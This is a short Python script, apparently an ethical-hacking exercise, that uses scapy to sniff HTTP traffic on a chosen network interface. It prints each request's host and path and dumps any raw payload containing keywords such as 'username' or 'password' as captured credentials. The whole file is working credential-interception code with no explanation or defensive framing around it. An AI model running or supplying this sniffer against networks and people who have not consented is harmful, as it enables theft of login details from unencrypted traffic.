import scapy.all as scapy
import sys
from scapy.layers import http
import socket
import os


argv=[]
argc=0


def sniffer(inInterface):
    scapy.sniff(iface=inInterface, store=False, prn=process_packet)

def process_packet(packet):
    if (packet.haslayer(http.HTTPRequest)):
        print(("[+] Http Request >> " + str(packet[http.HTTPRequest].Host.decode()) + str(packet[http.HTTPRequest].Path.decode())))
        if (packet.haslayer(scapy.Raw)):
            load = str(packet[scapy.Raw].load.decode())
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if (key in load):
                    print("\n\n")
                    print("[+] Possible password/username >> " + load + "\n\n\n")
                    break


def main():
    argv=sys.argv
    argc=len(argv)
    inInterface=""
    
    if(argv[1]=="-i" or argv[1]=="--interface"):
        inInterface=argv[2]
        
    sniffer(inInterface)
        
    
main()